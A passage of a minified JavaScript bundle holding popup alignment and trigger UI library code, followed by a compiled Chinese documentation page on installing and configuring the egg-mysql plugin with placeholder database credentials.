h=We(p,t,r,l,o),g=_e.merge(p,h);if(m&&(i.adjustX||i.adjustY)&&a){if(i.adjustX&&Ve(h,p,m)){var f=Qe(r,/[lr]/gi,{l:"r",r:"l"}),E=Ke(l,0),b=Ke(o,0),v=We(p,t,f,E,b);Ge(v,p,m)||(u=1,r=f,l=E,o=b)}if(i.adjustY&&$e(h,p,m)){var y=Qe(r,/[tb]/gi,{t:"b",b:"t"}),k=Ke(l,1),w=Ke(o,1),x=We(p,t,y,k,w);Xe(x,p,m)||(u=1,r=y,l=k,o=w)}u&&(h=We(p,t,r,l,o),_e.mix(g,h));var j=Ve(h,p,m),S=$e(h,p,m);if(j||S){var C=r;j&&(C=Qe(r,/[lr]/gi,{l:"r",r:"l"})),S&&(C=Qe(r,/[tb]/gi,{t:"b",b:"t"})),r=C,l=n.offset||[0,0],o=n.targetOffset||[0,0]}s.adjustX=i.adjustX&&j,s.adjustY=i.adjustY&&S,(s.adjustX||s.adjustY)&&(g=ze(h,p,m,s))}return g.width!==p.width&&_e.css(c,"width",_e.width(c)+g.width-p.width),g.height!==p.height&&_e.css(c,"height",_e.height(c)+g.height-p.height),_e.offset(c,{left:g.left,top:g.top},{useCssRight:n.useCssRight,useCssBottom:n.useCssBottom,useCssTransform:n.useCssTransform,ignoreShake:n.ignoreShake}),{points:r,offset:l,targetOffset:o,overflow:s}}function et(e,t){var n=Ue(e,t),a=He(e);return!n||a.left+a.width<=n.left||a.top+a.height<=n.top||a.left>=n.right||a.top>=n.bottom}function tt(e,t,n){var a=n.target||t,r=He(a),l=!et(a,n.overflow&&n.overflow.alwaysByViewport);return Ze(e,r,n,l)}function nt(e,t,n){var a,r,l=_e.getDocument(e),o=l.defaultView||l.parentWindow,i=_e.getWindowScrollLeft(o),c=_e.getWindowScrollTop(o),s=_e.viewportWidth(o),u=_e.viewportHeight(o);a="pageX"in t?t.pageX:i+t.clientX,r="pageY"in t?t.pageY:c+t.clientY;var d={left:a,top:r,width:0,height:0},m=a>=0&&a<=i+s&&r>=0&&r<=c+u,p=[n.points[0],"cc"];return Ze(e,d,M(M({},n),{},{points:p}),m)}tt.__getOffsetParent=Me,tt.__getVisibleRectForElement=Ue;var at=n("8Oo8"),rt=n("zWEY"),lt=n("paKd"),ot=function(e,t){var n=m.a.useRef(!1),a=m.a.useRef(null);function r(){window.clearTimeout(a.current)}function l(o){if(r(),n.current&&!0!==o)a.current=window.setTimeout((function(){n.current=!1,l()}),t);else{if(!1===e(o))return;n.current=!0,a.current=window.setTimeout((function(){n.current=!1}),t)}}return[l,function(){n.current=!1,r()}]},it=n("dzO+");function ct(e,t){return e===t||!(!e||!t)&&("pageX"in t&&"pageY"in t?e.pageX===t.pageX&&e.pageY===t.pageY:"clientX"in t&&"clientY"in t&&(e.clientX===t.clientX&&e.clientY===t.clientY))}function st(e,t){e!==document.activeElement&&Object(f["a"])(t,e)&&"function"===typeof e.focus&&e.focus()}function ut(e,t){var n=null,a=null;function r(e){var r=Object(L["a"])(e,1),l=r[0].target;if(document.documentElement.contains(l)){var o=l.getBoundingClientRect(),i=o.width,c=o.height,s=Math.floor(i),u=Math.floor(c);n===s&&a===u||Promise.resolve().then((function(){t({width:s,height:u})})),n=s,a=u}}var l=new it["a"](r);return e&&l.observe(e),function(){l.disconnect()}}function dt(e){return"function"!==typeof e?null:e()}function mt(e){return"object"===Object(_["a"])(e)&&e?e:null}var pt=function(e,t){var n=e.children,a=e.disabled,r=e.target,l=e.align,o=e.onAlign,i=e.monitorWindowResize,c=e.monitorBufferTime,s=void 0===c?0:c,u=m.a.useRef({}),d=m.a.useRef(),p=m.a.Children.only(n),h=m.a.useRef({});h.current.disabled=a,h.current.target=r,h.current.align=l,h.current.onAlign=o;var g=ot((function(){var e=h.current,t=e.disabled,n=e.target,a=e.align,r=e.onAlign,l=d.current;if(!t&&n&&l){var o,i=dt(n),c=mt(n);u.current.element=i,u.current.point=c,u.current.align=a;var s=document,m=s.activeElement;return i&&Object(rt["a"])(i)?o=tt(l,i,a):c&&(o=nt(l,c,a)),st(m,l),r&&o&&r(l,o),!0}return!1}),s),f=Object(L["a"])(g,2),E=f[0],y=f[1],k=m.a.useState(),w=Object(L["a"])(k,2),x=w[0],j=w[1],S=m.a.useState(),C=Object(L["a"])(S,2),A=C[0],T=C[1];return Object(lt["a"])((function(){j(dt(r)),T(mt(r))})),m.a.useEffect((function(){u.current.element===x&&ct(u.current.point,A)&&Object(at["a"])(u.current.align,l)||E()})),m.a.useEffect((function(){var e=ut(d.current,E);return e}),[d.current]),m.a.useEffect((function(){var e=ut(x,E);return e}),[x]),m.a.useEffect((function(){a?y():E()}),[a]),m.a.useEffect((function(){if(i){var e=Object(v["a"])(window,"resize",E);return e.remove}}),[i]),m.a.useEffect((function(){return function(){y()}}),[]),m.a.useImperativeHandle(t,(function(){return{forceAlign:function(){return E(!0)}}})),m.a.isValidElement(p)&&(p=m.a.cloneElement(p,{ref:Object(b["a"])(p.ref,d)})),p},ht=m.a.forwardRef(pt);ht.displayName="Align";var gt=ht,ft=gt,Et=n("ojUw"),bt=n("DytP"),vt=n("wx68"),yt=["measure","alignPre","align",null,"motion"],kt=function(e,t){var n=Object(vt["a"])(null),a=Object(L["a"])(n,2),r=a[0],l=a[1],o=Object(d["useRef"])();function i(e){l(e,!0)}function c(){g["a"].cancel(o.current)}function s(e){c(),o.current=Object(g["a"])((function(){i((function(e){switch(r){case"align":return"motion";case"motion":return"stable";default:}return e})),null===e||void 0===e||e()}))}return Object(d["useEffect"])((function(){i("measure")}),[e]),Object(d["useEffect"])((function(){switch(r){case"measure":t();break;default:}r&&(o.current=Object(g["a"])(Object(bt["a"])(Object(Et["a"])().mark((function e(){var t,n;return Object(Et["a"])().wrap((function(e){while(1)switch(e.prev=e.next){case 0:t=yt.indexOf(r),n=yt[t+1],n&&-1!==t&&i(n);case 3:case"end":return e.stop()}}),e)})))))}),[r]),Object(d["useEffect"])((function(){return function(){c()}}),[]),[r,s]},wt=function(e){var t=d["useState"]({width:0,height:0}),n=Object(L["a"])(t,2),a=n[0],r=n[1];function l(e){var t=e.offsetWidth,n=e.offsetHeight,a=e.getBoundingClientRect(),l=a.width,o=a.height;Math.abs(t-l)<1&&Math.abs(n-o)<1&&(t=l,n=o),r({width:t,height:n})}var o=d["useMemo"]((function(){var t={};if(e){var n=a.width,r=a.height;-1!==e.indexOf("height")&&r?t.height=r:-1!==e.indexOf("minHeight")&&r&&(t.minHeight=r),-1!==e.indexOf("width")&&n?t.width=n:-1!==e.indexOf("minWidth")&&n&&(t.minWidth=n)}return t}),[e,a]);return[o,l]},xt=d["forwardRef"]((function(e,t){var n=e.visible,l=e.prefixCls,o=e.className,i=e.style,c=e.children,s=e.zIndex,u=e.stretch,m=e.destroyPopupOnHide,p=e.forceRender,h=e.align,g=e.point,f=e.getRootDomNode,E=e.getClassNameFromAlign,b=e.onAlign,v=e.onMouseEnter,y=e.onMouseLeave,k=e.onMouseDown,w=e.onTouchStart,x=e.onClick,S=Object(d["useRef"])(),C=Object(d["useRef"])(),A=Object(d["useState"])(),T=Object(L["a"])(A,2),N=T[0],P=T[1],R=wt(u),_=Object(L["a"])(R,2),q=_[0],M=_[1];function F(){u&&M(f())}var D=kt(n,F),U=Object(L["a"])(D,2),z=U[0],H=U[1],B=Object(d["useState"])(0),W=Object(L["a"])(B,2),V=W[0],$=W[1],G=Object(d["useRef"])();function X(){return g||f}function Q(){var e;null===(e=S.current)||void 0===e||e.forceAlign()}function K(e,t){var n=E(t);N!==n&&P(n),$((function(e){return e+1})),"align"===z&&(null===b||void 0===b||b(e,t))}Object(lt["a"])((function(){"alignPre"===z&&$(0)}),[z]),Object(lt["a"])((function(){"align"===z&&(V<3?Q():H((function(){var e;null===(e=G.current)||void 0===e||e.call(G)})))}),[V]);var J=Object(a["a"])({},I(e));function Y(){return new Promise((function(e){G.current=e}))}["onAppearEnd","onEnterEnd","onLeaveEnd"].forEach((function(e){var t=J[e];J[e]=function(e,n){return H(),null===t||void 0===t?void 0:t(e,n)}})),d["useEffect"]((function(){J.motionName||"motion"!==z||H()}),[J.motionName,z]),d["useImperativeHandle"](t,(function(){return{forceAlign:Q,getElement:function(){return C.current}}}));var Z=Object(a["a"])(Object(a["a"])({},q),{},{zIndex:s,opacity:"motion"!==z&&"stable"!==z&&n?0:void 0,pointerEvents:n||"stable"===z?void 0:"none"},i),ee=!0;null===h||void 0===h||!h.points||"align"!==z&&"stable"!==z||(ee=!1);var te=c;return d["Children"].count(c)>1&&(te=d["createElement"]("div",{className:"".concat(l,"-content")},c)),d["createElement"](O["b"],Object(r["a"])({visible:n,ref:C,leavedClassName:"".concat(l,"-hidden")},J,{onAppearPrepare:Y,onEnterPrepare:Y,removeOnLeave:m,forceRender:p}),(function(e,t){var n=e.className,r=e.style,i=j()(l,o,N,n);return d["createElement"](ft,{target:X(),key:"popup",ref:S,monitorWindowResize:!0,disabled:ee,align:h,onAlign:K},d["createElement"]("div",{ref:t,className:i,onMouseEnter:v,onMouseLeave:y,onMouseDownCapture:k,onTouchStartCapture:w,onClick:x,style:Object(a["a"])(Object(a["a"])({},r),Z)},te))}))}));xt.displayName="PopupInner";var jt=xt,St=d["forwardRef"]((function(e,t){var n=e.prefixCls,l=e.visible,o=e.zIndex,i=e.children,c=e.mobile;c=void 0===c?{}:c;var s=c.popupClassName,u=c.popupStyle,m=c.popupMotion,p=void 0===m?{}:m,h=c.popupRender,g=e.onClick,f=d["useRef"]();d["useImperativeHandle"](t,(function(){return{forceAlign:function(){},getElement:function(){return f.current}}}));var E=Object(a["a"])({zIndex:o},u),b=i;return d["Children"].count(i)>1&&(b=d["createElement"]("div",{className:"".concat(n,"-content")},i)),h&&(b=h(b)),d["createElement"](O["b"],Object(r["a"])({visible:l,ref:f,removeOnLeave:!0},p),(function(e,t){var r=e.className,l=e.style,o=j()(n,s,r);return d["createElement"]("div",{ref:t,className:o,onClick:g,style:Object(a["a"])(Object(a["a"])({},l),E)},b)}))}));St.displayName="MobilePopupInner";var Ct=St,At=["visible","mobile"],Lt=d["forwardRef"]((function(e,t){var n=e.visible,l=e.mobile,o=Object(T["a"])(e,At),i=Object(d["useState"])(n),c=Object(L["a"])(i,2),s=c[0],u=c[1],m=Object(d["useState"])(!1),p=Object(L["a"])(m,2),h=p[0],g=p[1],f=Object(a["a"])(Object(a["a"])({},o),{},{visible:s});Object(d["useEffect"])((function(){u(n),n&&l&&g(Object(N["a"])())}),[n,l]);var E=h?d["createElement"](Ct,Object(r["a"])({},f,{mobile:l,ref:t})):d["createElement"](jt,Object(r["a"])({},f,{ref:t}));return d["createElement"]("div",null,d["createElement"](P,f),E)}));Lt.displayName="Popup";var Tt=Lt,Nt=d["createContext"](null),Ot=Nt;function It(){}function Pt(){return""}function Rt(e){return e?e.ownerDocument:window.document}var _t=["onClick","onMouseDown","onTouchStart","onMouseEnter","onMouseLeave","onFocus","onBlur","onContextMenu"];function qt(e){var t=function(t){Object(c["a"])(m,t);var n=Object(s["a"])(m);function m(e){var t,a;return Object(l["a"])(this,m),t=n.call(this,e),Object(u["a"])(Object(i["a"])(t),"popupRef",d["createRef"]()),Object(u["a"])(Object(i["a"])(t),"triggerRef",d["createRef"]()),Object(u["a"])(Object(i["a"])(t),"portalContainer",void 0),Object(u["a"])(Object(i["a"])(t),"attachId",void 0),Object(u["a"])(Object(i["a"])(t),"clickOutsideHandler",void 0),Object(u["a"])(Object(i["a"])(t),"touchOutsideHandler",void 0),Object(u["a"])(Object(i["a"])(t),"contextMenuOutsideHandler1",void 0),Object(u["a"])(Object(i["a"])(t),"contextMenuOutsideHandler2",void 0),Object(u["a"])(Object(i["a"])(t),"mouseDownTimeout",void 0),Object(u["a"])(Object(i["a"])(t),"focusTime",void 0),Object(u["a"])(Object(i["a"])(t),"preClickTime",void 0),Object(u["a"])(Object(i["a"])(t),"preTouchTime",void 0),Object(u["a"])(Object(i["a"])(t),"delayTimer",void 0),Object(u["a"])(Object(i["a"])(t),"hasPopupMouseDown",void 0),Object(u["a"])(Object(i["a"])(t),"onMouseEnter",(function(e){var n=t.props.mouseEnterDelay;t.fireEvents("onMouseEnter",e),t.delaySetPopupVisible(!0,n,n?null:e)})),Object(u["a"])(Object(i["a"])(t),"onMouseMove",(function(e){t.fireEvents("onMouseMove",e),t.setPoint(e)})),Object(u["a"])(Object(i["a"])(t),"onMouseLeave",(function(e){t.fireEvents("onMouseLeave",e),t.delaySetPopupVisible(!1,t.props.mouseLeaveDelay)})),Object(u["a"])(Object(i["a"])(t),"onPopupMouseEnter",(function(){t.clearDelayTimer()})),Object(u["a"])(Object(i["a"])(t),"onPopupMouseLeave",(function(e){var n;e.relatedTarget&&!e.relatedTarget.setTimeout&&Object(f["a"])(null===(n=t.popupRef.current)||void 0===n?void 0:n.getElement(),e.relatedTarget)||t.delaySetPopupVisible(!1,t.props.mouseLeaveDelay)})),Object(u["a"])(Object(i["a"])(t),"onFocus",(function(e){t.fireEvents("onFocus",e),t.clearDelayTimer(),t.isFocusToShow()&&(t.focusTime=Date.now(),t.delaySetPopupVisible(!0,t.props.focusDelay))})),Object(u["a"])(Object(i["a"])(t),"onMouseDown",(function(e){t.fireEvents("onMouseDown",e),t.preClickTime=Date.now()})),Object(u["a"])(Object(i["a"])(t),"onTouchStart",(function(e){t.fireEvents("onTouchStart",e),t.preTouchTime=Date.now()})),Object(u["a"])(Object(i["a"])(t),"onBlur",(function(e){t.fireEvents("onBlur",e),t.clearDelayTimer(),t.isBlurToHide()&&t.delaySetPopupVisible(!1,t.props.blurDelay)})),Object(u["a"])(Object(i["a"])(t),"onContextMenu",(function(e){e.preventDefault(),t.fireEvents("onContextMenu",e),t.setPopupVisible(!0,e)})),Object(u["a"])(Object(i["a"])(t),"onContextMenuClose",(function(){t.isContextMenuToShow()&&t.close()})),Object(u["a"])(Object(i["a"])(t),"onClick",(function(e){if(t.fireEvents("onClick",e),t.focusTime){var n;if(t.preClickTime&&t.preTouchTime?n=Math.min(t.preClickTime,t.preTouchTime):t.preClickTime?n=t.preClickTime:t.preTouchTime&&(n=t.preTouchTime),Math.abs(n-t.focusTime)<20)return;t.focusTime=0}t.preClickTime=0,t.preTouchTime=0,t.isClickToShow()&&(t.isClickToHide()||t.isBlurToHide())&&e&&e.preventDefault&&e.preventDefault();var a=!t.state.popupVisible;(t.isClickToHide()&&!a||a&&t.isClickToShow())&&t.setPopupVisible(!t.state.popupVisible,e)})),Object(u["a"])(Object(i["a"])(t),"onPopupMouseDown",(function(){var e;(t.hasPopupMouseDown=!0,clearTimeout(t.mouseDownTimeout),t.mouseDownTimeout=window.setTimeout((function(){t.hasPopupMouseDown=!1}),0),t.context)&&(e=t.context).onPopupMouseDown.apply(e,arguments)})),Object(u["a"])(Object(i["a"])(t),"onDocumentClick",(function(e){if(!t.props.mask||t.props.maskClosable){var n=e.target,a=t.getRootDomNode(),r=t.getPopupDomNode();Object(f["a"])(a,n)&&!t.isContextMenuOnly()||Object(f["a"])(r,n)||t.hasPopupMouseDown||t.close()}})),Object(u["a"])(Object(i["a"])(t),"getRootDomNode",(function(){var e=t.props.getTriggerDOMNode;if(e)return e(t.triggerRef.current);try{var n=Object(E["a"])(t.triggerRef.current);if(n)return n}catch(a){}return h.a.findDOMNode(Object(i["a"])(t))})),Object(u["a"])(Object(i["a"])(t),"getPopupClassNameFromAlign",(function(e){var n=[],a=t.props,r=a.popupPlacement,l=a.builtinPlacements,o=a.prefixCls,i=a.alignPoint,c=a.getPopupClassNameFromAlign;return r&&l&&n.push(A(l,o,e,i)),c&&n.push(c(e)),n.join(" ")})),Object(u["a"])(Object(i["a"])(t),"getComponent",(function(){var e=t.props,n=e.prefixCls,a=e.destroyPopupOnHide,l=e.popupClassName,o=e.onPopupAlign,i=e.popupMotion,c=e.popupAnimation,s=e.popupTransitionName,u=e.popupStyle,m=e.mask,p=e.maskAnimation,h=e.maskTransitionName,g=e.maskMotion,f=e.zIndex,E=e.popup,b=e.stretch,v=e.alignPoint,y=e.mobile,k=e.forceRender,w=e.onPopupClick,x=t.state,j=x.popupVisible,S=x.point,C=t.getPopupAlign(),A={};return t.isMouseEnterToShow()&&(A.onMouseEnter=t.onPopupMouseEnter),t.isMouseLeaveToHide()&&(A.onMouseLeave=t.onPopupMouseLeave),A.onMouseDown=t.onPopupMouseDown,A.onTouchStart=t.onPopupMouseDown,d["createElement"](Tt,Object(r["a"])({prefixCls:n,destroyPopupOnHide:a,visible:j,point:v&&S,className:l,align:C,onAlign:o,animation:c,getClassNameFromAlign:t.getPopupClassNameFromAlign},A,{stretch:b,getRootDomNode:t.getRootDomNode,style:u,mask:m,zIndex:f,transitionName:s,maskAnimation:p,maskTransitionName:h,maskMotion:g,ref:t.popupRef,motion:i,mobile:y,forceRender:k,onClick:w}),"function"===typeof E?E():E)})),Object(u["a"])(Object(i["a"])(t),"attachParent",(function(e){g["a"].cancel(t.attachId);var n,a=t.props,r=a.getPopupContainer,l=a.getDocument,o=t.getRootDomNode();r?(o||0===r.length)&&(n=r(o)):n=l(t.getRootDomNode()).body,n?n.appendChild(e):t.attachId=Object(g["a"])((function(){t.attachParent(e)}))})),Object(u["a"])(Object(i["a"])(t),"getContainer",(function(){if(!t.portalContainer){var e=t.props.getDocument,n=e(t.getRootDomNode()).createElement("div");n.style.position="absolute",n.style.top="0",n.style.left="0",n.style.width="100%",t.portalContainer=n}return t.attachParent(t.portalContainer),t.portalContainer})),Object(u["a"])(Object(i["a"])(t),"setPoint",(function(e){var n=t.props.alignPoint;n&&e&&t.setState({point:{pageX:e.pageX,pageY:e.pageY}})})),Object(u["a"])(Object(i["a"])(t),"handlePortalUpdate",(function(){t.state.prevPopupVisible!==t.state.popupVisible&&t.props.afterPopupVisibleChange(t.state.popupVisible)})),Object(u["a"])(Object(i["a"])(t),"triggerContextValue",{onPopupMouseDown:t.onPopupMouseDown}),a="popupVisible"in e?!!e.popupVisible:!!e.defaultPopupVisible,t.state={prevPopupVisible:a,popupVisible:a},_t.forEach((function(e){t["fire".concat(e)]=function(n){t.fireEvents(e,n)}})),t}return Object(o["a"])(m,[{key:"componentDidMount",value:function(){this.componentDidUpdate()}},{key:"componentDidUpdate",value:function(){var e,t=this.props,n=this.state;if(n.popupVisible)return this.clickOutsideHandler||!this.isClickToHide()&&!this.isContextMenuToShow()||(e=t.getDocument(this.getRootDomNode()),this.clickOutsideHandler=Object(v["a"])(e,"mousedown",this.onDocumentClick)),this.touchOutsideHandler||(e=e||t.getDocument(this.getRootDomNode()),this.touchOutsideHandler=Object(v["a"])(e,"touchstart",this.onDocumentClick)),!this.contextMenuOutsideHandler1&&this.isContextMenuToShow()&&(e=e||t.getDocument(this.getRootDomNode()),this.contextMenuOutsideHandler1=Object(v["a"])(e,"scroll",this.onContextMenuClose)),void(!this.contextMenuOutsideHandler2&&this.isContextMenuToShow()&&(this.contextMenuOutsideHandler2=Object(v["a"])(window,"blur",this.onContextMenuClose)));this.clearOutsideHandler()}},{key:"componentWillUnmount",value:function(){this.clearDelayTimer(),this.clearOutsideHandler(),clearTimeout(this.mouseDownTimeout),g["a"].cancel(this.attachId)}},{key:"getPopupDomNode",value:function(){var e;return(null===(e=this.popupRef.current)||void 0===e?void 0:e.getElement())||null}},{key:"getPopupAlign",value:function(){var e=this.props,t=e.popupPlacement,n=e.popupAlign,a=e.builtinPlacements;return t&&a?C(a,t,n):n}},{key:"setPopupVisible",value:function(e,t){var n=this.props.alignPoint,a=this.state.popupVisible;this.clearDelayTimer(),a!==e&&("popupVisible"in this.props||this.setState({popupVisible:e,prevPopupVisible:a}),this.props.onPopupVisibleChange(e)),n&&t&&e&&this.setPoint(t)}},{key:"delaySetPopupVisible",value:function(e,t,n){var a=this,r=1e3*t;if(this.clearDelayTimer(),r){var l=n?{pageX:n.pageX,pageY:n.pageY}:null;this.delayTimer=window.setTimeout((function(){a.setPopupVisible(e,l),a.clearDelayTimer()}),r)}else this.setPopupVisible(e,n)}},{key:"clearDelayTimer",value:function(){this.delayTimer&&(clearTimeout(this.delayTimer),this.delayTimer=null)}},{key:"clearOutsideHandler",value:function(){this.clickOutsideHandler&&(this.clickOutsideHandler.remove(),this.clickOutsideHandler=null),this.contextMenuOutsideHandler1&&(this.contextMenuOutsideHandler1.remove(),this.contextMenuOutsideHandler1=null),this.contextMenuOutsideHandler2&&(this.contextMenuOutsideHandler2.remove(),this.contextMenuOutsideHandler2=null),this.touchOutsideHandler&&(this.touchOutsideHandler.remove(),this.touchOutsideHandler=null)}},{key:"createTwoChains",value:function(e){var t=this.props.children.props,n=this.props;return t[e]&&n[e]?this["fire".concat(e)]:t[e]||n[e]}},{key:"isClickToShow",value:function(){var e=this.props,t=e.action,n=e.showAction;return-1!==t.indexOf("click")||-1!==n.indexOf("click")}},{key:"isContextMenuOnly",value:function(){var e=this.props.action;return"contextMenu"===e||1===e.length&&"contextMenu"===e[0]}},{key:"isContextMenuToShow",value:function(){var e=this.props,t=e.action,n=e.showAction;return-1!==t.indexOf("contextMenu")||-1!==n.indexOf("contextMenu")}},{key:"isClickToHide",value:function(){var e=this.props,t=e.action,n=e.hideAction;return-1!==t.indexOf("click")||-1!==n.indexOf("click")}},{key:"isMouseEnterToShow",value:function(){var e=this.props,t=e.action,n=e.showAction;return-1!==t.indexOf("hover")||-1!==n.indexOf("mouseEnter")}},{key:"isMouseLeaveToHide",value:function(){var e=this.props,t=e.action,n=e.hideAction;return-1!==t.indexOf("hover")||-1!==n.indexOf("mouseLeave")}},{key:"isFocusToShow",value:function(){var e=this.props,t=e.action,n=e.showAction;return-1!==t.indexOf("focus")||-1!==n.indexOf("focus")}},{key:"isBlurToHide",value:function(){var e=this.props,t=e.action,n=e.hideAction;return-1!==t.indexOf("focus")||-1!==n.indexOf("blur")}},{key:"forcePopupAlign",value:function(){var e;this.state.popupVisible&&(null===(e=this.popupRef.current)||void 0===e||e.forceAlign())}},{key:"fireEvents",value:function(e,t){var n=this.props.children.props[e];n&&n(t);var a=this.props[e];a&&a(t)}},{key:"close",value:function(){this.setPopupVisible(!1)}},{key:"render",value:function(){var t=this.state.popupVisible,n=this.props,r=n.children,l=n.forceRender,o=n.alignPoint,i=n.className,c=n.autoDestroy,s=d["Children"].only(r),u={key:"trigger"};this.isContextMenuToShow()?u.onContextMenu=this.onContextMenu:u.onContextMenu=this.createTwoChains("onContextMenu"),this.isClickToHide()||this.isClickToShow()?(u.onClick=this.onClick,u.onMouseDown=this.onMouseDown,u.onTouchStart=this.onTouchStart):(u.onClick=this.createTwoChains("onClick"),u.onMouseDown=this.createTwoChains("onMouseDown"),u.onTouchStart=this.createTwoChains("onTouchStart")),this.isMouseEnterToShow()?(u.onMouseEnter=this.onMouseEnter,o&&(u.onMouseMove=this.onMouseMove)):u.onMouseEnter=this.createTwoChains("onMouseEnter"),this.isMouseLeaveToHide()?u.onMouseLeave=this.onMouseLeave:u.onMouseLeave=this.createTwoChains("onMouseLeave"),this.isFocusToShow()||this.isBlurToHide()?(u.onFocus=this.onFocus,u.onBlur=this.onBlur):(u.onFocus=this.createTwoChains("onFocus"),u.onBlur=this.createTwoChains("onBlur"));var m=j()(s&&s.props&&s.props.className,i);m&&(u.className=m);var p=Object(a["a"])({},u);Object(b["c"])(s)&&(p.ref=Object(b["a"])(this.triggerRef,s.ref));var h,g=d["cloneElement"](s,p);return(t||this.popupRef.current||l)&&(h=d["createElement"](e,{key:"portal",getContainer:this.getContainer,didUpdate:this.handlePortalUpdate},this.getComponent())),!t&&c&&(h=null),d["createElement"](Ot.Provider,{value:this.triggerContextValue},g,h)}}],[{key:"getDerivedStateFromProps",value:function(e,t){var n=e.popupVisible,a={};return void 0!==n&&t.popupVisible!==n&&(a.popupVisible=n,a.prevPopupVisible=t.popupVisible),a}}]),m}(d["Component"]);return Object(u["a"])(t,"contextType",Ot),Object(u["a"])(t,"defaultProps",{prefixCls:"rc-trigger-popup",getPopupClassNameFromAlign:Pt,getDocument:Rt,onPopupVisibleChange:It,afterPopupVisibleChange:It,onPopupAlign:It,popupClassName:"",mouseEnterDelay:0,mouseLeaveDelay:.1,focusDelay:0,blurDelay:.15,popupStyle:{},destroyPopupOnHide:!1,popupAlign:{},defaultPopupVisible:!1,mask:!1,maskClosable:!0,action:[],showAction:[],hideAction:[],autoDestroy:!1}),t}t["a"]=qt(w)},"y/MD":function(e,t,n){var a=n("A0UU"),r=n("2g9I"),l=n("aE1z"),o=n("XExY");for(var i in r){var c=a[i],s=c&&c.prototype;if(s&&s.forEach!==l)try{o(s,"forEach",l)}catch(u){s.forEach=l}}},y18q:function(e,t,n){"use strict";n.r(t);var a=n("FU0I"),r=n.n(a),l=n("j00X"),o=n("P/fr"),i=r.a.memo((e=>{e.demos;return r.a.createElement(r.a.Fragment,null,r.a.createElement("div",{className:"markdown"},r.a.createElement("p",null,"\u5728 Web \u5e94\u7528\u65b9\u9762 MySQL \u662f\u6700\u5e38\u89c1\uff0c\u6700\u597d\u7684\u5173\u7cfb\u578b\u6570\u636e\u5e93\u4e4b\u4e00\u3002\u975e\u5e38\u591a\u7f51\u7ad9\u90fd\u9009\u62e9 MySQL \u4f5c\u4e3a\u7f51\u7ad9\u6570\u636e\u5e93\u3002"),r.a.createElement("h2",{id:"egg-mysql"},r.a.createElement(l["AnchorLink"],{to:"#egg-mysql","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"egg-mysql"),r.a.createElement("p",null,"\u6846\u67b6\u63d0\u4f9b\u4e86 ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-mysql"},"egg-mysql")," \u63d2\u4ef6\u6765\u8bbf\u95ee MySQL \u6570\u636e\u5e93\u3002\u8fd9\u4e2a\u63d2\u4ef6\u65e2\u53ef\u4ee5\u8bbf\u95ee\u666e\u901a\u7684 MySQL \u6570\u636e\u5e93\uff0c\u4e5f\u53ef\u4ee5\u8bbf\u95ee\u57fa\u4e8e MySQL \u534f\u8bae\u7684\u5728\u7ebf\u6570\u636e\u5e93\u670d\u52a1\u3002"),r.a.createElement("h3",{id:"\u5b89\u88c5\u4e0e\u914d\u7f6e"},r.a.createElement(l["AnchorLink"],{to:"#\u5b89\u88c5\u4e0e\u914d\u7f6e","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u5b89\u88c5\u4e0e\u914d\u7f6e"),r.a.createElement("p",null,"\u5b89\u88c5\u5bf9\u5e94\u7684\u63d2\u4ef6 ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-mysql"},"egg-mysql")," \uff1a"),r.a.createElement(o["a"],{code:"$ npm i --save egg-mysql",lang:"bash"}),r.a.createElement("p",null,"\u5f00\u542f\u63d2\u4ef6\uff1a"),r.a.createElement(o["a"],{code:"// config/plugin.js\nexports.mysql = {\n  enable: true,\n  package: 'egg-mysql',\n};",lang:"js"}),r.a.createElement("p",null,"\u5728 ",r.a.createElement("code",null,"config/config.$","{","env","}",".js")," \u914d\u7f6e\u5404\u4e2a\u73af\u5883\u7684\u6570\u636e\u5e93\u8fde\u63a5\u4fe1\u606f\u3002"),r.a.createElement("h4",{id:"\u5355\u6570\u636e\u6e90"},r.a.createElement(l["AnchorLink"],{to:"#\u5355\u6570\u636e\u6e90","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u5355\u6570\u636e\u6e90"),r.a.createElement("p",null,"\u5982\u679c\u6211\u4eec\u7684\u5e94\u7528\u53ea\u9700\u8981\u8bbf\u95ee\u4e00\u4e2a MySQL \u6570\u636e\u5e93\u5b9e\u4f8b\uff0c\u53ef\u4ee5\u5982\u4e0b\u914d\u7f6e\uff1a"),r.a.createElement(o["a"],{code:"// config/config.${env}.js\nexports.mysql = {\n  // \u5355\u6570\u636e\u5e93\u4fe1\u606f\u914d\u7f6e\n  client: {\n    // host\n    host: 'mysql.com',\n    // \u7aef\u53e3\u53f7\n    port: '3306',\n    // \u7528\u6237\u540d\n    user: 'test_user',\n    // \u5bc6\u7801\n    password: 'test_password',\n    // \u6570\u636e\u5e93\u540d\n    database: 'test',\n  },\n  // \u662f\u5426\u52a0\u8f7d\u5230 app \u4e0a\uff0c\u9ed8\u8ba4\u5f00\u542f\n  app: true,\n  // \u662f\u5426\u52a0\u8f7d\u5230 agent \u4e0a\uff0c\u9ed8\u8ba4\u5173\u95ed\n  agent: false,\n};",lang:"js"}),r.a.createElement("p",null,"\u4f7f\u7528\u65b9\u5f0f\uff1a"),r.a.createElement(o["a"],{code:"await app.mysql.query(sql, values); // \u5355\u5b9e\u4f8b\u53ef\u4ee5\u76f4\u63a5\u901a\u8fc7 app.mysql \u8bbf\u95ee",lang:"js"}),r.a.createElement("h4",{id:"\u591a\u6570\u636e\u6e90"},r.a.createElement(l["AnchorLink"],{to:"#\u591a\u6570\u636e\u6e90","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u591a\u6570\u636e\u6e90"),r.a.createElement("p",null,"\u5982\u679c\u6211\u4eec\u7684\u5e94\u7528\u9700\u8981\u8bbf\u95ee\u591a\u4e2a MySQL \u6570\u636e\u6e90\uff0c\u53ef\u4ee5\u6309\u7167\u5982\u4e0b\u914d\u7f6e\uff1a"),r.a.createElement(o["a"],{code:"exports.mysql = {\n  clients: {\n    // clientId, \u83b7\u53d6client\u5b9e\u4f8b\uff0c\u9700\u8981\u901a\u8fc7 app.mysql.get('clientId') \u83b7\u53d6\n    db1: {\n      // host\n      host: 'mysql.com',\n      // \u7aef\u53e3\u53f7\n      port: '3306',\n      // \u7528\u6237\u540d\n      user: 'test_user',\n      // \u5bc6\u7801\n      password: 'test_password',\n      // \u6570\u636e\u5e93\u540d\n 